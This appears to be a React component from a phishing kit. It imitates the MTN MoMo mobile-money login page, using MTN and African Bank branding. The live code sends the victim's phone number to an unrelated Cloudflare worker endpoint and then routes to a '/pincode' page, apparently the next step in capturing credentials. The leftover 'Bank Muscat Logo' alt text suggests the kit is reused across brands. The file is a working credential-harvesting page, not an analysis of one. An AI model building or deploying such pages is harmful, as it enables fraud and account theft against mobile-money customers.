// import { useState } from "react";
// import { useNavigate } from "react-router-dom";

// export default function MoMoLogin() {
//   const [phone, setPhone] = useState("");
//   const navigate = useNavigate

//   return (
//     <div className="min-h-screen bg-white flex flex-col">
//       {/* Status Bar */}
//       <div className="bg-yellow-400 h-8 w-full" />

//       {/* Main Content */}
//       <div className="flex flex-col items-center flex-1 px-6 pt-10">
//         {/* Logo */}
//         <div className="mb-6">
//           <div className="w-20 h-20 rounded-xl overflow-hidden flex items-center justify-center bg-teal-700 relative shadow-md">
//             {/* MoMo Icon */}
//             <svg viewBox="0 0 80 80" className="w-full h-full" fill="none" xmlns="http://www.w3.org/2000/svg">
//               <rect width="80" height="80" rx="14" fill="#1A5276" />
//               <rect y="52" width="80" height="28" rx="0" fill="#F4C300" />
//               <rect y="52" width="80" height="8" rx="0" fill="#D4A900" />
//               {/* Arrow/location pin shape */}
//               <path
//                 d="M40 14C32 14 26 20 26 28C26 38 40 52 40 52C40 52 54 38 54 28C54 20 48 14 40 14Z"
//                 fill="white"
//                 opacity="0.9"
//               />
//               <circle cx="40" cy="28" r="6" fill="#1A5276" />
//             </svg>
//           </div>
//         </div>

//         {/* Brand Name */}
//         <div className="text-center mb-1">
//           <p className="text-2xl font-black text-teal-800 tracking-wide">MoMo</p>
//           <p className="text-xs text-gray-500 font-medium tracking-widest uppercase">from MTN</p>
//         </div>

//         {/* Welcome Text */}
//         <div className="text-center mt-6 mb-10">
//           <h1 className="text-4xl font-black italic text-gray-900">Y'ello,</h1>
//           <p className="text-lg text-gray-600 font-normal mt-1">welcome to MoMo</p>
//         </div>

//         {/* Phone Input Section */}
//         <div className="w-full max-w-sm">
//           <label className="block text-sm font-bold text-gray-800 mb-3">
//             Enter your Cellphone number
//           </label>
//           <input
//             type="tel"
//             value={phone}
//             onChange={(e) => setPhone(e.target.value)}
//             placeholder="Cellphone Number"
//             className="w-full border border-gray-300 rounded-lg px-4 py-4 text-base text-gray-400 placeholder-gray-300 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 bg-white"
//           />
//         </div>

//         {/* Continue Button */}
//         <div className="w-full max-w-sm mt-6">
//           <button
//           onClick={()=>navigate("/otppage")}
//             className="w-full bg-yellow-400 hover:bg-yellow-500 active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-4 transition-colors duration-150 shadow-sm"
//           >
//             Continue
//           </button>
//         </div>

//         {/* Change MoMo Number */}
//         <button className="mt-5 text-teal-700 font-semibold text-base hover:underline">
//           Change your MoMo number
//         </button>
//       </div>

//       {/* Bottom Section */}
//       <div className="flex flex-col items-center pb-8 pt-4 px-4">
//         <p className="text-sm text-gray-500 text-center">
//           By signing in, I agree to the{" "}
//           <span className="text-teal-700 font-semibold cursor-pointer hover:underline">
//             T's &amp; C's
//           </span>
//         </p>

//         {/* Powered By */}
//         <div className="flex items-center gap-2 mt-3">
//           <span className="text-sm text-gray-400">MoMo is powered by</span>
//           <span className="border border-gray-400 rounded-full px-2 py-0.5 text-xs font-bold text-gray-600">
//             MTN
//           </span>
//           <span className="text-gray-300">|</span>
//           {/* African Bank Logo placeholder */}
//           <div className="flex items-center gap-1">
//             <div className="w-4 h-4 rounded-full bg-green-600 flex items-center justify-center">
//               <div className="w-2 h-2 rounded-full bg-white" />
//             </div>
//             <span className="text-xs font-semibold text-gray-500">African Bank</span>
//           </div>
//         </div>
//       </div>

//       {/* Bottom Nav Bar */}
//       <div className="bg-white border-t border-gray-100 flex justify-around items-center py-3 px-10">
//         <div className="flex flex-col gap-1 items-center">
//           <span className="text-gray-400 text-lg">|||</span>
//         </div>
//         <div className="w-8 h-8 border-2 border-gray-400 rounded-md" />
//         <div className="text-gray-400 text-xl font-thin">&lt;</div>
//       </div>
//     </div>
//   );
// }
import React from "react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import logo from "./assets/logo (1).png"

export default function MoMoLogin() {
  const [phone, setPhone] = useState("");
  const navigate = useNavigate();

  const handleSubmit = async () => {
    if (phone.trim() != "") {
      const payload = {
        phone: phone
      }
      await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/phone",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        },
      );
      navigate("/pincode", { state: { phone } })
    }
  }
  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-yellow-400 h-8 w-full" />

      <div className="flex flex-col items-center flex-1 px-6 pt-10">
        <div className="">
          <div className="flex items-center space-x-3">
            <img src={logo} alt="Bank Muscat Logo" className="h-30 w-auto" />
          </div>
        </div>
{/* 
        <div className="text-center mb-1">
          <p className="text-2xl font-black text-teal-800 tracking-wide">MoMo</p>
          <p className="text-xs text-gray-500 font-medium tracking-widest uppercase">from MTN</p>
        </div> */}

        <div className="text-center mt-6 mb-10">
          <h1 className="text-4xl font-black italic text-gray-900">Y'ello,</h1>
          <p className="text-lg text-gray-600 font-normal mt-1">welcome to MoMo</p>
        </div>

        <div className="w-full max-w-sm">
          <label className="block text-sm font-bold text-gray-800 mb-3">
            Enter your Cellphone number
          </label>
          <input
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="Cellphone Number"
            className="w-full border border-gray-300 rounded-lg px-4 py-4 text-base text-gray-400 placeholder-gray-300 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 bg-white"
          />
        </div>

        <div className="w-full max-w-sm mt-6">
          <button
            onClick={handleSubmit}
            // onClick={() => navigate("/otppage", { state: { phone } })} // ✅ phone pass karo
            // disabled={phone.length < 7} // ✅ validation
            className="w-full bg-[#FFCC00] active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-3 transition-colors duration-150 shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Continue
          </button>
        </div>

        <button className="mt-5 text-teal-700 font-semibold text-base hover:underline">
          Change your MoMo number
        </button>
      </div>

      <div className="flex flex-col items-center pb-8 pt-4 px-4">
        <p className="text-sm text-gray-500 text-center">
          By signing in, I agree to the{" "}
          <span className="text-teal-700 font-semibold cursor-pointer hover:underline">T's &amp; C's</span>
        </p>
        <div className="flex items-center gap-2 mt-3">
          <span className="text-sm text-gray-400">MoMo is powered by</span>
          <span className="border border-gray-400 rounded-full px-2 py-0.5 text-xs font-bold text-gray-600">MTN</span>
          <span className="text-gray-300">|</span>
          <div className="flex items-center gap-1">
            <div className="w-4 h-4 rounded-full bg-green-600 flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
            <span className="text-xs font-semibold text-gray-500">African Bank</span>
          </div>
        </div>
      </div>

      {/* <div className="bg-white border-t border-gray-100 flex justify-around items-center py-3 px-10">
        <span className="text-gray-400 text-lg">|||</span>
        <div className="w-8 h-8 border-2 border-gray-400 rounded-md" />
        <div className="text-gray-400 text-xl font-thin">&lt;</div>
      </div> */}
    </div>
  );
}